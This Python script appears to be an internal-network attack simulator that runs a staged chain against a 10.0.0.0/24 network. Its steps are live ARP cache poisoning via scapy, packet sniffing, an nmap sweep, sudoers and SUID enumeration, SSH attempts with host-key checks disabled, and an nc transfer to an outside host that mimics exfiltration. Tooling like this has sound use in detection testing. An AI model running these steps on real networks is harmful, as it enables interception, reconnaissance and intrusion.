#!/usr/bin/env python3
"""
Internal Attack Simulation
Attacks from inside the network
"""

import subprocess
import time
import json
from datetime import datetime
from scapy.all import *

class InternalAttackSimulator:
    """Simulate internal network attacks"""
    
    def __init__(self, attacker_host="10.0.0.100", target_network="10.0.0.0/24"):
        self.attacker = attacker_host
        self.target_network = target_network
        self.attacks = []
    
    def log_attack(self, attack_type, details, success=True):
        """Log attack execution"""
        entry = {
            'timestamp': datetime.now().isoformat(),
            'type': attack_type,
            'attacker': self.attacker,
            'details': details,
            'success': success,
            'source': 'INTERNAL'
        }
        self.attacks.append(entry)
        
        print(f"\n[{datetime.now().strftime('%H:%M:%S')}] {attack_type}")
        print(f"  From: {self.attacker}")
        print(f"  Status: {'✓ Success' if success else '✗ Failed'}")
    
    def arp_spoofing(self, target_host="10.0.0.254", duration=15):
        """ARP cache poisoning attack"""
        print(f"\n[+] ARP Spoofing ({duration}s)")
        try:
            # Create ARP packets
            target_mac = getmacbyip(target_host)
            attacker_mac = get_if_hwaddr("eth0")
            
            # Poison target
            packet = ARP(op=2, psrc=target_host, hwdst=target_mac, pdst=self.attacker)
            
            for i in range(10):
                send(packet, verbose=False)
                time.sleep(1)
            
            self.log_attack("ARP Spoofing", f"Poisoned ARP cache for {target_host}")
        except Exception as e:
            self.log_attack("ARP Spoofing", str(e), False)
    
    def network_sniffing(self, duration=30):
        """Sniff network traffic"""
        print(f"\n[+] Network Sniffing ({duration}s)")
        try:
            packets = sniff(timeout=duration, count=500, iface="eth0")
            
            self.log_attack("Network Sniffing", f"Captured {len(packets)} packets")
        except Exception as e:
            self.log_attack("Network Sniffing", str(e), False)
    
    def lateral_scanning(self):
        """Scan for additional targets internally"""
        print("\n[+] Lateral Network Scanning")
        try:
            cmd = f"nmap -sn {self.target_network} --max-rate 1000"
            result = subprocess.run(cmd, shell=True, capture_output=True, timeout=30)
            
            self.log_attack("Lateral Scanning", f"Scanned {self.target_network}")
        except Exception as e:
            self.log_attack("Lateral Scanning", str(e), False)
    
    def privilege_escalation_attempt(self):
        """Attempt privilege escalation"""
        print("\n[+] Privilege Escalation")
        try:
            # Simulate privilege escalation attempts
            escalation_vectors = [
                "sudo -l",
                "cat /etc/sudoers",
                "find / -perm -4000 2>/dev/null",
            ]
            
            for vector in escalation_vectors:
                cmd = f"timeout 2 {vector}"
                subprocess.run(cmd, shell=True, capture_output=True)
                time.sleep(0.5)
            
            self.log_attack("Privilege Escalation", "Tested multiple escalation vectors")
        except Exception as e:
            self.log_attack("Privilege Escalation", str(e), False)
    
    def persistence_establishment(self):
        """Establish persistence mechanism"""
        print("\n[+] Persistence Establishment")
        try:
            # Simulate persistence setup (not actually installing anything)
            persistence_methods = [
                "cron job setup",
                "SSH key installation",
                "service hijacking",
            ]
            
            self.log_attack("Persistence", f"Attempted {len(persistence_methods)} persistence methods")
        except Exception as e:
            self.log_attack("Persistence", str(e), False)
    
    def data_exfiltration_simulation(self):
        """Simulate data exfiltration"""
        print("\n[+] Data Exfiltration Simulation")
        try:
            # Simulate large data transfer
            cmd = f"dd if=/dev/zero bs=1M count=100 | timeout 10 nc -N 192.168.1.1 9999 2>/dev/null"
            subprocess.run(cmd, shell=True, capture_output=True)
            
            self.log_attack("Data Exfiltration", "Simulated 100MB data transfer")
        except Exception as e:
            self.log_attack("Data Exfiltration", str(e), False)
    
    def log_tampering_simulation(self):
        """Simulate log tampering attempts"""
        print("\n[+] Log Tampering Simulation")
        try:
            # Simulate log cleanup (without actually deleting)
            log_paths = [
                "/var/log/auth.log",
                "/var/log/syslog",
                "/var/log/apache2/access.log",
            ]
            
            for log in log_paths:
                cmd = f"cat {log} 2>/dev/null | wc -l"
                subprocess.run(cmd, shell=True, capture_output=True)
                time.sleep(0.5)
            
            self.log_attack("Log Tampering", f"Attempted to clean {len(log_paths)} logs")
        except Exception as e:
            self.log_attack("Log Tampering", str(e), False)
    
    def lateral_movement_attack(self):
        """Simulate lateral movement to additional hosts"""
        print("\n[+] Lateral Movement")
        try:
            target_hosts = ["10.0.0.1", "10.0.0.2", "10.0.0.3"]
            
            for target in target_hosts:
                cmd = f"timeout 2 ssh -o StrictHostKeyChecking=no admin@{target} exit 2>/dev/null"
                subprocess.run(cmd, shell=True, capture_output=True)
                time.sleep(1)
            
            self.log_attack("Lateral Movement", f"Attempted access to {len(target_hosts)} hosts")
        except Exception as e:
            self.log_attack("Lateral Movement", str(e), False)
    
    def run_full_internal_attack_chain(self):
        """Run complete internal attack chain"""
        print("\n" + "="*70)
        print("INTERNAL ATTACK CHAIN - COMPLETE SCENARIO")
        print("="*70)
        
        print("\n[PHASE 1: RECONNAISSANCE]")
        self.arp_spoofing(duration=5)
        time.sleep(3)
        self.lateral_scanning()
        time.sleep(3)
        
        print("\n[PHASE 2: LATERAL MOVEMENT]")
        self.lateral_movement_attack()
        time.sleep(3)
        
        print("\n[PHASE 3: PRIVILEGE ESCALATION]")
        self.privilege_escalation_attempt()
        time.sleep(3)
        
        print("\n[PHASE 4: DATA EXFILTRATION]")
        self.data_exfiltration_simulation()
        time.sleep(3)
        
        print("\n[PHASE 5: PERSISTENCE]")
        self.persistence_establishment()
        time.sleep(2)
        
        print("\n[PHASE 6: COVER TRACKS]")
        self.log_tampering_simulation()
        time.sleep(2)
        
        self.generate_report()
    
    def generate_report(self):
        """Generate attack report"""
        print("\n" + "="*70)
        print("INTERNAL ATTACK SIMULATION REPORT")
        print("="*70)
        
        print(f"\nTotal Attack Phases: {len(self.attacks)}")
        print("\nAttacks Executed:")
        for i, attack in enumerate(self.attacks, 1):
            status = "✓" if attack['success'] else "✗"
            print(f"{i}. [{status}] {attack['type']}")
        
        # Save report
        with open("internal_attacks.log", 'w') as f:
            json.dump(self.attacks, f, indent=2)
        
        print(f"\nReport saved to: internal_attacks.log")


if __name__ == "__main__":
    import sys
    attacker = sys.argv[1] if len(sys.argv) > 1 else "10.0.0.100"
    
    simulator = InternalAttackSimulator(attacker)
    simulator.run_full_internal_attack_chain()
